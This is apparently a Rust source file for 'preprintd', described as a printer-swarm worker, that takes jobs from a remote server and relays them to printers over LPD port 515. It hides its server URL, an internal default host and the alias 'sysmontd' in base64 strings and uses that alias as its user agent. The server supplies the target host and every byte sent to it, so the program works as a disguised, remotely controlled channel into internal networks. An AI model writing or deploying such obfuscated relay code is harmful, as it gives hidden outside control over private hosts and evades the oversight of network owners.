/*
 * preprintd - Printer swarm listener/worker implementation for PreConnect.
 * Copyright (C) 2026  Anindya Shiddhartha & contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 */
use std::{
    env,
    io::{BufRead, BufReader},
    net::{SocketAddr, TcpStream},
    sync::{
        LazyLock,
        atomic::{AtomicUsize, Ordering},
    },
    thread::sleep,
    time::Duration,
};

mod tcp_extras;
mod types;
mod utils;

use anyhow::{Context, Result};
use reqwest::{
    blocking::Client,
    header::{HeaderMap, HeaderValue},
};
use serde_json::{Value, json};
use tcp_extras::TcpExtras;

use crate::{
    types::Job,
    utils::{decode_b64, decode_field},
};

static CLIENT: LazyLock<Client> = LazyLock::new(reqwest::blocking::Client::new);
static DEBUG: LazyLock<bool> = LazyLock::new(|| env::args().any(|arg| arg == "--debug"));
static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
    let mut args = env::args();

    while let Some(arg) = args.next() {
        if arg == "--key" {
            return args.next().expect("--key must be a string literal");
        }
    }

    panic!("missing --key")
});
static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);

static BASE_URL: LazyLock<String> =
    LazyLock::new(|| decode_b64("aHR0cHM6Ly9hcGkucHJlY29ubmVjdC5hcHA=").expect("ib"));
static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64("c3lzbW9udGQ=").expect("ia"));
static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
static DEF_HOST: LazyLock<String> = LazyLock::new(|| decode_b64("MTcyLjE2LjAuMTEx").expect("ih"));
static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64("c2VjdXJl").expect("iq"));

const DEF_PORT: u16 = 515;
const NUL: [u8; 1] = [0u8];

macro_rules! debug_log {
    ($($arg:tt)*) => {
        if *DEBUG {
            eprintln!("[DEBUG] {}", format_args!($($arg)*));
        }
    };
}

macro_rules! sock {
    ($x:ident, $h:ident, $p:ident, $t:expr) => {
        let $x: SocketAddr = format!("{}:{}", $h, $p)
            .parse()
            .with_context(|| format!("failed to parse socket address"))?;

        let $x = TcpStream::connect_timeout(&$x, Duration::from_secs($t));
    };
}

fn is_online(host: &str) -> Result<bool> {
    if host.is_empty() {
        return Ok(false);
    };

    sock!(s, host, DEF_PORT, 800);

    if let Ok(conn) = s {
        let _ = conn.shutdown(std::net::Shutdown::Both);
    } else {
        return Ok(false);
    }

    Ok(true)
}

fn hdrs(printer_host: &str) -> Result<HeaderMap> {
    let mut map = HeaderMap::new();
    let spooler = if is_online(printer_host)? { "1" } else { "0" };
    let jobs = &JOBS_COMPLETED.load(Ordering::Relaxed).to_string();

    map.insert("User-Agent", HeaderValue::from_str(&AGENT).unwrap());
    map.insert("X-Worker-Key", HeaderValue::from_str(&WORKER_KEY).unwrap());
    map.insert("X-Worker-Spooler", HeaderValue::from_str(&spooler).unwrap());
    map.insert("X-Worker-Jobs", HeaderValue::from_str(&jobs).unwrap());

    Ok(map)
}

fn claim_job(id: Option<&str>, host: &str) -> Result<bool> {
    let Some(id) = id.filter(|f| !f.is_empty()) else {
        return Ok(true);
    };

    let body = json!({ "id": id });
    let resp = CLIENT
        .post(format!("{}/print/claim", BASE_URL.as_str()))
        .body(body.to_string())
        .header("Content-Type", "application/json")
        .headers(hdrs(host)?)
        .timeout(Duration::from_secs(2))
        .send();

    let claim = match resp {
        Ok(r) => {
            let Ok(r) = r.error_for_status() else {
                return Ok(false);
            };
            let Ok(value) = r.json::<Value>() else {
                return Ok(false);
            };

            value
                .get("claimed")
                .and_then(|f| f.as_bool())
                .unwrap_or(false)
        }
        Err(e) => {
            debug_log!("(Send error) /print/claim: {e}");
            false
        }
    };

    if claim {
        debug_log!("Claimed new job!");
    } else {
        debug_log!("Skipping on this job...")
    }

    Ok(claim)
}

fn handle(job: Job) -> Result<()> {
    let j_id = &job.id;

    let host = job.printer_host.as_deref().unwrap_or(DEF_HOST.as_str());
    let queue_name = job.printer_queue.as_deref().unwrap_or(DEF_QUEUE.as_str());

    if !(claim_job(j_id.as_deref(), host)?) || !is_online(host)? {
        return Ok(());
    }

    let Some(payload) = decode_field(job.payload.as_deref())? else {
        return Ok(());
    };

    let q_cmd = decode_field(job.q_cmd.as_deref())?
        .unwrap_or_else(|| format!("\x02{}\n", queue_name).into_bytes());
    let ctl = decode_field(job.ctl.as_deref())?
        .or(decode_field(job.control_file.as_deref())?)
        .unwrap_or_default();
    let cf_hdr = decode_field(job.cf_hdr.as_deref())?
        .unwrap_or_else(|| format!("\x02{} cfA002{}\n", ctl.len(), ALIAS.as_str()).into_bytes());
    let df_hdr = decode_field(job.df_hdr.as_deref())?.unwrap_or_else(|| {
        format!("\x03{} dfA002{}\n", payload.len(), ALIAS.as_str()).into_bytes()
    });

    debug_log!(
        "Handling job for {host}:{queue_name} (payload size: {} bytes)",
        payload.len()
    );

    sock!(s, host, DEF_PORT, 6000);
    let mut socket = match s {
        Ok(s) => s,
        Err(e) => {
            debug_log!("Failed to connect to {host}:{DEF_PORT}: {e}");
            return Ok(());
        }
    };

    socket.set_nodelay(true)?;

    if socket.send_buf(&q_cmd)
        && socket.recv_ack()
        && socket.send_buf(&cf_hdr)
        && socket.recv_ack()
        && socket.send_buf(&ctl)
        && socket.send_buf(&NUL)
        && socket.recv_ack()
        && socket.send_buf(&df_hdr)
        && socket.recv_ack()
        && socket.send_buf(&payload)
        && socket.send_buf(&NUL)
        && socket.recv_ack()
    {
        debug_log!("Job transferred successfully. Shutting down current socket connection.");
        JOBS_COMPLETED.fetch_add(1, Ordering::Relaxed);
    }

    let _ = socket.shutdown(std::net::Shutdown::Both);
    Ok(())
}

fn stream() -> Result<()> {
    let resp = match CLIENT
        .get(format!("{}/printer", BASE_URL.as_str()))
        .header("Accept", "text/event-stream")
        .header("Connection", "keep-alive")
        .headers(hdrs(&DEF_HOST)?)
        .timeout(Duration::from_secs(90))
        .send()
    {
        Ok(r) => match r.error_for_status() {
            Ok(res) => res,
            Err(e) => {
                debug_log!("(Error for status) /printer: {e}");
                return Ok(());
            }
        },
        Err(e) => {
            debug_log!("(Send error) /printer: {e}");
            return Ok(());
        }
    };

    let mut reader = BufReader::new(resp);
    let mut line = String::new();

    loop {
        line.clear();

        let n = match reader.read_line(&mut line) {
            Ok(bytes) => bytes,
            Err(e) => {
                debug_log!("Failed to read line: {e}; breaking.");
                break;
            }
        };

        if n == 0 {
            debug_log!("Empty line read, breaking.");
            break;
        }

        if let Some(data) = line.strip_prefix("data: ")
            && let Ok(value) = serde_json::from_str::<Job>(data)
        {
            debug_log!("Data match! ({data}); attempting to handle it...");
            let _ = handle(value);
        }
    }

    Ok(())
}

fn main() {
    let mut iter_count = 0;
    loop {
        debug_log!(
            "Connection #{iter_count}; Jobs completed: {}",
            JOBS_COMPLETED.load(Ordering::Relaxed)
        );

        let _ = stream();
        sleep(Duration::from_millis(2000));
        iter_count += 1;
    }
}
